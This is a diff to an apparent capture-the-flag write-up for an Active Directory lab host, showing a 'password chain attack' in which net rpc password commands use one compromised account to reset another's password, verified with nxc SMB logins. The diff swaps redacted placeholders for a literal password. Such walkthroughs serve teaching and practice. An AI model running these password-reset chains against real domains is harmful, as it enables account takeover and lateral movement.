@@ -393,15 +393,15 @@ Session completed.</code></pre>
 
   <h3><span class="step">[Step 10]</span> Password Chain Attack</h3>
   <p><strong>Step 1:</strong> Using <code>a.harris</code> to change <code>i.park</code>'s password:</p>
-  <pre><code>$ net rpc password "i.park" '[REDACTED]' -U "WELCOME.local/a.harris%[REDACTED]" -S "DC01.WELCOME.local"
-$ nxc smb 10.1.159.7 -u i.park -p '[REDACTED]'</code></pre>
+  <pre><code>$ net rpc password "i.park" 'Zerotrace123!' -U "WELCOME.local/a.harris%[REDACTED]" -S "DC01.WELCOME.local"
+$ nxc smb 10.1.159.7 -u i.park -p 'Zerotrace123!'</code></pre>
 
   <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.1.159.7      445    DC01             [+] WELCOME.local\i.park:[REDACTED]</code></pre>
 
   <p><strong>Step 2:</strong> Using <code>i.park</code> to change <code>SVC_CA</code>'s password:</p>
-  <pre><code>$ net rpc password "SVC_CA" '[REDACTED]' -U "WELCOME.local/i.park%[REDACTED]" -S "DC01.WELCOME.local"
-$ nxc smb 10.1.159.7 -u SVC_CA -p '[REDACTED]'</code></pre>
+  <pre><code>$ net rpc password "SVC_CA" 'Zerotrace123!' -U "WELCOME.local/i.park%[REDACTED]" -S "DC01.WELCOME.local"
+$ nxc smb 10.1.159.7 -u SVC_CA -p 'Zerotrace123!'</code></pre>
 
   <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.1.159.7      445    DC01             [+] WELCOME.local\SVC_CA:[REDACTED]</code></pre>
